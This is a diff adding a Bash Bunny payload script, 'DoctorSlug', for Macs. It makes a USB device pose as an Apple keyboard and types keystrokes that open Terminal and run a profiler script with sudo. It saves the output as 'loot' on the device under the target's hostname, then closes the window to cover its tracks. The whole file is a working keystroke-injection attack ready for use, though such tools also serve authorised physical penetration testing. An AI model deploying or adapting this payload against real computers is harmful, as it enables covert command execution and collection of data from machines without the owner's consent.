@@ -1,0 +1,54 @@
+#!/bin/bash
+#
+# Title:         DoctorSlug
+# Author:        mikeflynn / hydrox
+# Version:       1.0
+#
+# Runs the Doctor Slug Mac profiler and saves report to the loot dir under the computer's name.
+# Ex loot/DoctorSlug/{name}/report.txt
+#
+# See Doctor Slug repo for information about what it runs: https://github.com/mikeflynn/doctor-slug
+#
+# Red ...........Setup
+# Red Blinking...Setup Failed. Exit.
+# Amber..........Scanning
+# Green..........Finished
+#
+
+LOOTBASE=/Volumes/BashBunny/loot/doctorslug
+PAYLOADBASE=/Volumes/BashBunny/payloads/$SWITCH_POSITION
+
+LED SETUP
+ATTACKMODE HID VID_0X05AC PID_0X021E STORAGE
+GET TARGET_HOSTNAME
+GET SWITCH_POSITION
+
+mkdir -p $LOOTBASE
+HOST=${TARGET_HOSTNAME}
+[[ -z "$HOST" ]] && HOST="noname"
+TODAY=$(date '+%Y-%m-%d')
+
+
+# Start Terminal and Run Doctor Slug
+
+LED ATTACK
+
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 2500
+QUACK STRING sudo "$PAYLOADBASE/drslug.sh" > "$LOOTBASE/$HOST/$TODAY.txt"
+
+# Eject and Cleanup
+
+LED CLEANUP
+
+sync
+QUACK ENTER
+QUACK GUI W
+QUACK ENTER
+
+# Finished
+
+LED FINISH
